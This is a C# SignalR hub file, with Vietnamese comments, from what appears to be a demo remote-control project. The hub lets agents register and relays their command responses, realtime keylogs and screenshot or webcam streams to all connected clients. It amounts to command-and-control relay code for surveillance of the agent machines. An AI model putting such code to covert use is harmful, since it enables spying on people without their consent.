using Microsoft.AspNetCore.SignalR;
using RCS.Common.Models;
using RCS.Common.Protocols;
using RCS.Server.Services;
using System;
using System.Threading.Tasks;

namespace RCS.Server.Hubs
{
    // Hub dành riêng cho Agent kết nối
    public class AgentHub : Hub
    {
        private readonly IHubContext<ClientHub> _clientHubContext;
        private readonly IConnectionManager _connectionManager;

        public AgentHub(IHubContext<ClientHub> clientHubContext, IConnectionManager connectionManager)
        {
            _clientHubContext = clientHubContext;
            _connectionManager = connectionManager;
        }

        // 1. Agent đăng ký ID khi vừa kết nối
        public void RegisterAgent(string agentId)
        {
            _connectionManager.AddAgent(agentId, Context.ConnectionId);
            Console.WriteLine($"[AgentHub] Agent Registered: {agentId}");
        }

        // 2. Agent gửi phản hồi lệnh (List App, Process...)
        public async Task SendResponse(ResponseMessage response)
        {
            // Forward về cho tất cả Client đang theo dõi
            // (Thực tế nên filter Client nào đang điều khiển Agent này, nhưng demo gửi All)
            await _clientHubContext.Clients.All.SendAsync("ReceiveResponse", response);
        }

        // 3. Agent gửi Keylog realtime
        public async Task SendUpdate(RealtimeUpdate update)
        {
            await _clientHubContext.Clients.All.SendAsync("ReceiveUpdate", update);
        }

        // 4. Agent gửi Stream (Screenshot/Webcam) - Binary/Base64
        public async Task SendBinaryStream(string base64Data)
        {
            await _clientHubContext.Clients.All.SendAsync("ReceiveBinaryChunk", base64Data);
        }

        // Xử lý khi Agent ngắt kết nối
        public override Task OnDisconnectedAsync(Exception exception)
        {
            _connectionManager.RemoveAgent(Context.ConnectionId);
            Console.WriteLine($"[AgentHub] Agent Disconnected: {Context.ConnectionId}");
            return base.OnDisconnectedAsync(exception);
        }
    }
}